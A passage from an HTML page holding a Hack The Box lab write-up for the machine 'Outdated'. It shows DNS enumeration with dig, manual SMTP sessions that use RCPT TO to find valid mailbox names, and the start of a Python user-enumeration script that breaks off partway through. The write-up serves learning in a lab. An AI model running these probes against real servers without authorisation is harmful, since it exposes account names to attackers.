@@ -1,0 +1,915 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Sandworm" href="../sandworm/sandworm.html" /><link rel="prev" title="Only4you" href="../only4you/only4you.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Outdated - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="../ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <p><img alt="outdated.png" src="../../../../_images/outdated.png" /></p>
+<section id="outdated">
+<h1>Outdated<a class="headerlink" href="#outdated" title="Permalink to this heading">#</a></h1>
+<section id="dns-enum">
+<h2>DNS Enum<a class="headerlink" href="#dns-enum" title="Permalink to this heading">#</a></h2>
+<p>We know about the domain name because the SMTP server discloses it</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">25</span>/tcp<span class="w">   </span>open<span class="w">  </span>smtp<span class="w">          </span>hMailServer<span class="w"> </span>smtpd
+<span class="p">|</span><span class="w"> </span>smtp-commands:<span class="w"> </span>mail.outdated.htb,<span class="w"> </span>SIZE<span class="w"> </span><span class="m">20480000</span>,<span class="w"> </span>AUTH<span class="w"> </span>LOGIN,<span class="w"> </span>HELP
+<span class="p">|</span>_<span class="w"> </span><span class="m">211</span><span class="w"> </span>DATA<span class="w"> </span>HELO<span class="w"> </span>EHLO<span class="w"> </span>MAIL<span class="w"> </span>NOOP<span class="w"> </span>QUIT<span class="w"> </span>RCPT<span class="w"> </span>RSET<span class="w"> </span>SAML<span class="w"> </span>TURN<span class="w"> </span>VRFY
+</pre></div>
+</div>
+<p>so we can probe the DNS server for more information</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dig<span class="w"> </span>ANY<span class="w"> </span>@10.10.11.175<span class="w"> </span>outdated.htb
+dig<span class="w"> </span>ANY<span class="w"> </span>@10.10.11.175<span class="w"> </span>outdated.htb<span class="w"> </span>+short
+<span class="m">10</span>.10.11.175
+<span class="m">172</span>.16.20.1
+dc.outdated.htb.
+dc.outdated.htb.<span class="w"> </span>hostmaster.outdated.htb.<span class="w"> </span><span class="m">228</span><span class="w"> </span><span class="m">900</span><span class="w"> </span><span class="m">600</span><span class="w"> </span><span class="m">86400</span><span class="w"> </span><span class="m">3600</span>
+dead:beef::108
+dead:beef::6558:dffe:4c79:13ba
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Domain<span class="w"> </span>Name:<span class="w"> </span>OUTDATED
+Domain<span class="w"> </span>Sid:<span class="w"> </span>S-1-5-21-4089647348-67660539-4016542185
+</pre></div>
+</div>
+</section>
+<section id="smtp-enumeration-tangent">
+<h2>SMTP Enumeration Tangent<a class="headerlink" href="#smtp-enumeration-tangent" title="Permalink to this heading">#</a></h2>
+<p>The following wasn’t necessarilly a very fruitfull for the enumeration of this box<br />
+But it still was a good learning experience<br />
+On a previos machine, (trick) I had written a very simple python script to enumerate users from a postfix server.<br />
+And it worked by abusing the VRFY function.<br />
+This server here seems to be something called hMailServer smtpd if Nmap fingerprinting is correct.<br />
+As mentionned earyer the SMTP server, it discloses the domain name immediately on connectioni</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>telnet<span class="w"> </span>outdated.htb<span class="w"> </span><span class="m">25</span>
+Trying<span class="w"> </span><span class="m">10</span>.10.11.175...
+Connected<span class="w"> </span>to<span class="w"> </span>outdated.htb.
+Escape<span class="w"> </span>character<span class="w"> </span>is<span class="w"> </span><span class="s1">&#39;^]&#39;</span>.
+<span class="m">220</span><span class="w"> </span>mail.outdated.htb<span class="w"> </span>ESMTP
+EHLO<span class="w"> </span>mail.outdated.htb
+<span class="m">250</span>-mail.outdated.htb
+<span class="m">250</span>-SIZE<span class="w"> </span><span class="m">20480000</span>
+<span class="m">250</span>-AUTH<span class="w"> </span>LOGIN
+<span class="m">250</span><span class="w"> </span>HELP
+</pre></div>
+</div>
+<p>Unfortunately though the VRFY command is disallowed,<br />
+So I won’t be able to reuse the script I wrote from trick</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>HELP
+<span class="m">211</span><span class="w"> </span>DATA<span class="w"> </span>HELO<span class="w"> </span>EHLO<span class="w"> </span>MAIL<span class="w"> </span>NOOP<span class="w"> </span>QUIT<span class="w"> </span>RCPT<span class="w"> </span>RSET<span class="w"> </span>SAML<span class="w"> </span>TURN<span class="w"> </span>VRFY
+VRFY<span class="w"> </span>asdf@asdf.org
+<span class="m">502</span><span class="w"> </span>VRFY<span class="w"> </span>disallowed.
+</pre></div>
+</div>
+<p>Looking for other options in Hacktricks, I decide to give a try to the RCPT enumeration method<br />
+and it looks like its gonna work</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>MAIL<span class="w"> </span>FROM:<span class="w"> </span>asdf@asdf.org
+<span class="m">250</span><span class="w"> </span>OK
+RCPT<span class="w"> </span>TO:asdf@outdated.htb
+<span class="m">550</span><span class="w"> </span>Unknown<span class="w"> </span>user
+RCPT<span class="w"> </span>TO:itsupport@outdated.htb
+<span class="m">250</span><span class="w"> </span>OK
+</pre></div>
+</div>
+<p>So at this stage I started writing silly python script to enumerate smtp users with RCPT.<br />
+I ended up with this:</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+
+<span class="k">class</span> <span class="nc">Smpt</span><span class="p">():</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">userlist</span><span class="p">,</span> <span class="n">mailfrom</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">25</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">target</span> <span class="o">=</span> <span class="n">target</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">userlist</span> <span class="o">=</span> <span class="n">userlist</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">mailfrom</span> <span class="o">=</span> <span class="p">[</span><span class="n">mailfrom</span><span class="p">,</span> <span class="kc">True</span><span class="p">]</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="kc">None</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">targetBanner</span> <span class="o">=</span> <span class="kc">None</span>
+
+    <span class="k">def</span> <span class="nf">readUsers</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">userlist</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+            <span class="n">users</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">userlist</span> <span class="o">=</span> <span class="n">users</span>
+        <span class="k">return</span>
+
+    <span class="k">def</span> <span class="nf">buildSock</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="bp">self</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">port</span><span class="p">))</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+        <span class="n">banner</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)[</span><span class="mi">4</span><span class="p">::]</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">targetBanner</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">targetBanner</span> <span class="o">=</span> <span class="n">banner</span>
+        <span class="k">return</span>
+
